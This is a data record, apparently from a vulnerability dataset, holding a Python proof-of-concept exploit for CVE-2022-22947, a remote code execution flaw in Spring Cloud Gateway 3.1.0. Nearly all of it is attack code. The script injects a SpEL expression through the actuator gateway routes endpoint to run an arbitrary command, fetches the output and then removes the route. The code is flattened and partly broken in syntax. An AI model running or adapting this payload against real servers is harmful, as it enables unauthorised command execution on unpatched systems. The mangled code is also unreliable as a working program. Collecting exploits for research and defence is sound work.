{
    "text": "vul_name : Spring Cloud Gateway 3.1.0 Remote Code Execution ， vul_cve : CVE-2022-22947 ， vul_poc :  # Exploit Title : Spring Cloud Gateway 3.1.0 - Remote Code Execution ( RCE )  ，  # Google Dork : N/A ，  # Date : 03/03/2022 ，  # Exploit Author : Carlos E. Vieira ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : This vulnerability affect Spring Cloud Gateway < 3.0.7 & < 3.1.1 ，  # Tested on : 3.1.0 ，  # CVE : CVE-2022-22947 ， headers = { \"Content-Type\" : \"application/json\" , 'User-Agent' : 'Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/74.0.3729.169 Safari/537.36' , 'Accept' : ' * / * '} ， proxies = { ， 'http' : ' ， 'https' : ' ， } ， id = '.join ( random.choice ( string.ascii_lowercase ) for i in range ( 8 )  ， payload = { \"id\" : id , \"filters\" :  [ { \"name\" : \"AddResponseHeader\" , \"args\" : { \"name\" : \"Result\" , \"value\" : \" # {new String ( T ( org.springframework.util.StreamUtils ) .copyToByteArray ( T ( java.lang.Runtime ) .getRuntime (  ) .exec ( \\u0022\"+command+\"\\u0022 ) .getInputStream (  ) }\"} ]  , \"uri\" : \" ， commandb64 =base64.b64encode ( command.encode ( 'utf-8' ) .decode ( 'utf-8' )  ， rbase = requests.post ( url + '/actuator/gateway/routes/'+id , headers=headers , data=json.dumps ( payload )  , proxies=proxies , verify=False )  ， print ( \" [ + ] Stage deployed to /actuator/gateway/routes/\"+id )  ， print ( \" [ + ] Executing command.\" )  ， r = requests.post ( url + '/actuator/gateway/refresh' , headers=headers , proxies=proxies , verify=False )  ， print ( \" [ + ] getting result.\" )  ， r = requests.get ( url + '/actuator/gateway/routes/' + id , headers=headers , proxies=proxies , verify=False )  ， get_response = r.json (  )  ， clean ( url , id )  ， print ( \" [ - ] Error : Invalid response\" )  ， clean ( url , id )  ， exit ( 1 )  ， clean ( url , id )  ， print ( \" [ - ] Error executing command\" )  ， remove = requests.delete ( url + '/actuator/gateway/routes/' + id , headers=headers , proxies=proxies , verify=False )  ， print ( \" [ + ] Stage removed ! \" )  ， print ( \" [ - ] Error : Fail to remove stage\" )  ， print ( \" ，  # Exploit for CVE-2022-22947 #  ，  # - Carlos Vieira ( Crowsec )  #  ，  # Usage :  #  ，  # python3 exploit.py <url> <command> #  ，  # Example :  #  ，  # python3 exploit.py 'id' #  ， \" )  ， banner (  )  ， print ( \" [ - ] Error : Invalid arguments\" )  ， print ( \" [ - ] Usage : python3 exploit.py <url> <command>\" )  ， exit ( 1 )  ， url = sys.argv [ 1 ]  ， command = sys.argv [ 2 ]  ， print ( exploit ( url , command )  ， main (  ) ",
    "time": "2022.03.07"
}